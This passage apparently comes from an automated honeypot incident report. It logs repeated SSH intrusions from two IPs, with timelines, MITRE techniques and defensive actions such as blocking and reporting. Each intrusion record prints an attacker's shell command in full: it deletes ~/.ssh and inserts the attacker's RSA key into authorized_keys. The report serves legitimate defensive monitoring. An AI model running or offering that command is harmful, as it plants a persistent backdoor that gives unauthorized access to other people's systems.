| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:32:59` | `cowrie.session.connect` |
| `2026-04-26 06:32:59` | `cowrie.client.version` |
| `2026-04-26 06:32:59` | `cowrie.client.kex` |
| `2026-04-26 06:33:00` | `cowrie.login.success` |
| `2026-04-26 06:33:00` | `cowrie.session.params` |
| `2026-04-26 06:33:00` | `cowrie.command.input` |
| `2026-04-26 06:33:00` | `cowrie.command.failed` |
| `2026-04-26 06:33:00` | `cowrie.log.closed` |
| `2026-04-26 06:33:00` | `cowrie.session.params` |
| `2026-04-26 06:33:00` | `cowrie.command.input` |
| `2026-04-26 06:33:01` | `cowrie.session.file_download` |
| `2026-04-26 06:33:01` | `cowrie.log.closed` |
| `2026-04-26 06:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbeee76ead77

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:33 |
| **Last Seen** | 2026-04-26 06:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:33:03` | `cowrie.session.connect` |
| `2026-04-26 06:33:03` | `cowrie.client.version` |
| `2026-04-26 06:33:03` | `cowrie.client.kex` |
| `2026-04-26 06:33:03` | `cowrie.login.success` |
| `2026-04-26 06:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-892bc921de9d

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:34 |
| **Last Seen** | 2026-04-26 06:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:34:19` | `cowrie.session.connect` |
| `2026-04-26 06:34:19` | `cowrie.client.version` |
| `2026-04-26 06:34:19` | `cowrie.client.kex` |
| `2026-04-26 06:34:19` | `cowrie.login.success` |
| `2026-04-26 06:34:19` | `cowrie.session.params` |
| `2026-04-26 06:34:19` | `cowrie.command.input` |
| `2026-04-26 06:34:19` | `cowrie.command.failed` |
| `2026-04-26 06:34:19` | `cowrie.log.closed` |
| `2026-04-26 06:34:20` | `cowrie.session.params` |
| `2026-04-26 06:34:20` | `cowrie.command.input` |
| `2026-04-26 06:34:20` | `cowrie.session.file_download` |
| `2026-04-26 06:34:20` | `cowrie.log.closed` |
| `2026-04-26 06:34:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7e8e1dda95f

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:34 |
| **Last Seen** | 2026-04-26 06:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:34:21` | `cowrie.session.connect` |
| `2026-04-26 06:34:21` | `cowrie.client.version` |
| `2026-04-26 06:34:22` | `cowrie.client.kex` |
| `2026-04-26 06:34:22` | `cowrie.login.success` |
| `2026-04-26 06:34:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.66.34[.]121` to AbuseIPDB if not already reported
- [ ] Block `157.66.34[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-004cd7170423

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:36 |
| **Last Seen** | 2026-04-26 06:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:36:00` | `cowrie.session.connect` |
| `2026-04-26 06:36:00` | `cowrie.client.version` |
| `2026-04-26 06:36:00` | `cowrie.client.kex` |
| `2026-04-26 06:36:01` | `cowrie.login.success` |
| `2026-04-26 06:36:01` | `cowrie.session.params` |
| `2026-04-26 06:36:01` | `cowrie.command.input` |
| `2026-04-26 06:36:01` | `cowrie.command.failed` |
| `2026-04-26 06:36:01` | `cowrie.log.closed` |
| `2026-04-26 06:36:02` | `cowrie.session.params` |
| `2026-04-26 06:36:02` | `cowrie.command.input` |
| `2026-04-26 06:36:02` | `cowrie.session.file_download` |
| `2026-04-26 06:36:02` | `cowrie.log.closed` |
| `2026-04-26 06:36:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f1d3a982297

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:36 |
| **Last Seen** | 2026-04-26 06:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:36:04` | `cowrie.session.connect` |
| `2026-04-26 06:36:04` | `cowrie.client.version` |
| `2026-04-26 06:36:04` | `cowrie.client.kex` |
| `2026-04-26 06:36:04` | `cowrie.login.success` |
| `2026-04-26 06:36:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82002790b9f1

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:37 |
| **Last Seen** | 2026-04-26 06:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:37:11` | `cowrie.session.connect` |
| `2026-04-26 06:37:11` | `cowrie.client.version` |
| `2026-04-26 06:37:11` | `cowrie.client.kex` |
| `2026-04-26 06:37:12` | `cowrie.login.success` |
| `2026-04-26 06:37:12` | `cowrie.session.params` |
| `2026-04-26 06:37:12` | `cowrie.command.input` |
| `2026-04-26 06:37:12` | `cowrie.command.failed` |
| `2026-04-26 06:37:12` | `cowrie.log.closed` |
| `2026-04-26 06:37:12` | `cowrie.session.params` |
| `2026-04-26 06:37:12` | `cowrie.command.input` |
| `2026-04-26 06:37:12` | `cowrie.session.file_download` |
| `2026-04-26 06:37:12` | `cowrie.log.closed` |
| `2026-04-26 06:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-348231624deb

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:37 |
| **Last Seen** | 2026-04-26 06:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:37:14` | `cowrie.session.connect` |
| `2026-04-26 06:37:14` | `cowrie.client.version` |
| `2026-04-26 06:37:14` | `cowrie.client.kex` |
| `2026-04-26 06:37:15` | `cowrie.login.success` |
| `2026-04-26 06:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22b9ba118b94

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:38 |
| **Last Seen** | 2026-04-26 06:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:38:08` | `cowrie.session.connect` |
| `2026-04-26 06:38:08` | `cowrie.client.version` |
| `2026-04-26 06:38:08` | `cowrie.client.kex` |
| `2026-04-26 06:38:09` | `cowrie.login.success` |
| `2026-04-26 06:38:09` | `cowrie.session.params` |
| `2026-04-26 06:38:09` | `cowrie.command.input` |
| `2026-04-26 06:38:09` | `cowrie.command.failed` |
| `2026-04-26 06:38:09` | `cowrie.log.closed` |
| `2026-04-26 06:38:09` | `cowrie.session.params` |
| `2026-04-26 06:38:09` | `cowrie.command.input` |
| `2026-04-26 06:38:10` | `cowrie.session.file_download` |
| `2026-04-26 06:38:10` | `cowrie.log.closed` |
| `2026-04-26 06:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dec28bd3c180

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:38 |
| **Last Seen** | 2026-04-26 06:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:38:11` | `cowrie.session.connect` |
| `2026-04-26 06:38:11` | `cowrie.client.version` |
| `2026-04-26 06:38:12` | `cowrie.client.kex` |
| `2026-04-26 06:38:12` | `cowrie.login.success` |
| `2026-04-26 06:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdffdff746ac

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:39 |
| **Last Seen** | 2026-04-26 06:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:39:05` | `cowrie.session.connect` |
| `2026-04-26 06:39:05` | `cowrie.client.version` |
| `2026-04-26 06:39:05` | `cowrie.client.kex` |
| `2026-04-26 06:39:05` | `cowrie.login.success` |
| `2026-04-26 06:39:06` | `cowrie.session.params` |
| `2026-04-26 06:39:06` | `cowrie.command.input` |
| `2026-04-26 06:39:06` | `cowrie.command.failed` |
| `2026-04-26 06:39:06` | `cowrie.log.closed` |
| `2026-04-26 06:39:06` | `cowrie.session.params` |
| `2026-04-26 06:39:06` | `cowrie.command.input` |
| `2026-04-26 06:39:06` | `cowrie.session.file_download` |
| `2026-04-26 06:39:06` | `cowrie.log.closed` |
| `2026-04-26 06:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f24ff688f99e

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:39 |
| **Last Seen** | 2026-04-26 06:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:39:08` | `cowrie.session.connect` |
| `2026-04-26 06:39:08` | `cowrie.client.version` |
| `2026-04-26 06:39:08` | `cowrie.client.kex` |
| `2026-04-26 06:39:09` | `cowrie.login.success` |
| `2026-04-26 06:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c2b6fdc4c6d

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:40 |
| **Last Seen** | 2026-04-26 06:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:40:02` | `cowrie.session.connect` |
| `2026-04-26 06:40:02` | `cowrie.client.version` |
| `2026-04-26 06:40:03` | `cowrie.client.kex` |
| `2026-04-26 06:40:03` | `cowrie.login.success` |
| `2026-04-26 06:40:03` | `cowrie.session.params` |
| `2026-04-26 06:40:03` | `cowrie.command.input` |
| `2026-04-26 06:40:03` | `cowrie.command.failed` |
| `2026-04-26 06:40:03` | `cowrie.log.closed` |
| `2026-04-26 06:40:04` | `cowrie.session.params` |
| `2026-04-26 06:40:04` | `cowrie.command.input` |
| `2026-04-26 06:40:04` | `cowrie.session.file_download` |
| `2026-04-26 06:40:04` | `cowrie.log.closed` |
| `2026-04-26 06:40:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-479032afdc4d

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:40 |
| **Last Seen** | 2026-04-26 06:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:40:06` | `cowrie.session.connect` |
| `2026-04-26 06:40:06` | `cowrie.client.version` |
| `2026-04-26 06:40:06` | `cowrie.client.kex` |
| `2026-04-26 06:40:06` | `cowrie.login.success` |
| `2026-04-26 06:40:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fbfd9967862

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:41 |
| **Last Seen** | 2026-04-26 06:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:41:05` | `cowrie.session.connect` |
| `2026-04-26 06:41:05` | `cowrie.client.version` |
| `2026-04-26 06:41:05` | `cowrie.client.kex` |
| `2026-04-26 06:41:06` | `cowrie.login.success` |
| `2026-04-26 06:41:06` | `cowrie.session.params` |
| `2026-04-26 06:41:06` | `cowrie.command.input` |
| `2026-04-26 06:41:06` | `cowrie.command.failed` |
| `2026-04-26 06:41:06` | `cowrie.log.closed` |
| `2026-04-26 06:41:06` | `cowrie.session.params` |
| `2026-04-26 06:41:06` | `cowrie.command.input` |
| `2026-04-26 06:41:06` | `cowrie.session.file_download` |
| `2026-04-26 06:41:06` | `cowrie.log.closed` |
| `2026-04-26 06:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cc44958af7f

| Field | Detail |
|---|---|
| **Source IP** | `103.199.16[.]90` |
| **First Seen** | 2026-04-26 06:41 |
| **Last Seen** | 2026-04-26 06:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:41:08` | `cowrie.session.connect` |
| `2026-04-26 06:41:08` | `cowrie.client.version` |
| `2026-04-26 06:41:08` | `cowrie.client.kex` |
| `2026-04-26 06:41:09` | `cowrie.login.success` |
| `2026-04-26 06:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.199.16[.]90` to AbuseIPDB if not already reported
- [ ] Block `103.199.16[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a34e38657d9

| Field | Detail |
|---|---|
| **Source IP** | `157.66.34[.]121` |
| **First Seen** | 2026-04-26 06:43 |
| **Last Seen** | 2026-04-26 06:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 06:43:10` | `cowrie.session.connect` |
| `2026-04-26 06:43:10` | `cowrie.client.version` |
| `2026-04-26 06:43:10` | `cowrie.client.kex` |
| `2026-04-26 06:43:10` | `cowrie.login.success` |
| `2026-04-26 06:43:10` | `cowrie.session.params` |
| `2026-04-26 06:43:10` | `cowrie.command.input` |
